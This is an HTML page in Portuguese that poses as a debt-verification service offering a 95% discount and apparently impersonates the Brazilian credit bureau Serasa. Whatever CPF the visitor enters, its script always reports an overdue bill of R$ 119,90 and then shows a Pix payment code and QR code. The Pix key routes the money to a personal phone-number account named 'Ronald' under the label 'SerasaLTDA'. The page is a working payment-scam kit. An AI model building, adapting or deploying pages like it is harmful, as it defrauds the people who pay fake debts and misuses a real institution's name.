<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Contas</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .container {
            width: 90%;
            max-width: 400px;
            padding: 20px;
            background-color: white;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            text-align: center;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            font-size: 16px;
        }
        .hidden {
            display: none;
        }
        .loading {
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loading div {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

<div class="container" id="initial-screen">
    <h2>Verificar Contas com Desconto 95%</h2>
    <input type="text" id="cpf" placeholder="Digite seu CPF">
    <button onclick="verifyCPF()">Verificar</button>
</div>

<div class="container hidden" id="loading-screen">
    <div class="loading">
        <div></div>
    </div>
    <p>Verificando...</p>
</div>

<div class="container hidden" id="result-screen">
    <h2>Status das Contas</h2>
    <p id="status-message"></p>
    <div id="accounts-list" class="hidden">
        <!-- Lista de contas em atraso será gerada aqui -->
    </div>
</div>

<div class="container hidden" id="payment-screen">
    <h2>Efetuar Pagamento</h2>
    <p id="account-details"></p>
    <p>Chave Pix: <span id="pix-key">00020126360014BR.GOV.BCB.PIX0114+55989817809535204000053039865406119.905802BR5906Ronald6009Sao paulo62140510SerasaLTDA63041224</span></p>
    <button onclick="copyPixKey()">Copiar Chave Pix</button>
    <img id="qr-code" src="" alt="Código QR para pagamento">
</div>

<script>
    function verifyCPF() {
        document.getElementById('initial-screen').classList.add('hidden');
        document.getElementById('loading-screen').classList.remove('hidden');
        
        setTimeout(() => {
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('result-screen').classList.remove('hidden');
            
            let statusMessage = document.getElementById('status-message');
            let accountsList = document.getElementById('accounts-list');
            
            // Simulando a verificação de contas
            let hasOverdueAccounts = true; // Alterar conforme necessário
            
            if (hasOverdueAccounts) {
                statusMessage.textContent = "Você tem contas em atraso.";
                accountsList.classList.remove('hidden');
                accountsList.innerHTML = `
                    <div>
                        <p>Conta 1: R$ 119,90 - Vencimento: 10/07/2024</p>
                        <button onclick="showPaymentScreen('Conta 1', '119.90', '00020126360014BR.GOV.BCB.PIX0114+55989817809535204000053039865406119.905802BR5906Ronald6009Sao paulo62140510SerasaLTDA63041224')">Efetuar Pagamento</button>
                    </div>
                `;
            } else {
                statusMessage.textContent = "Você não tem contas em atraso.";
            }
        }, 2000); // Simulando um delay de 2 segundos
    }

    function showPaymentScreen(accountName, amount, pixKey) {
        document.getElementById('result-screen').classList.add('hidden');
        document.getElementById('payment-screen').classList.remove('hidden');
        
        document.getElementById('account-details').textContent = `${accountName}: R$ ${amount}`;
        document.getElementById('pix-key').textContent = pixKey;
        document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${encodeURIComponent(pixKey)}&amount=${amount}`;
    }

    function copyPixKey() {
        let pixKey = document.getElementById('pix-key').textContent;
        let tempInput = document.createElement("input");
        tempInput.style.position = "absolute";
        tempInput.style.left = "-9999px";
        tempInput.value = pixKey;
        document.body.appendChild(tempInput);
        tempInput.select();
        document.execCommand("copy");
        document.body.removeChild(tempInput);
        alert("Chave Pix copiada!");
    }

    function confirmPayment() {
        document.getElementById('payment-success').classList.remove('hidden');
    }
</script>

</body>
</html>
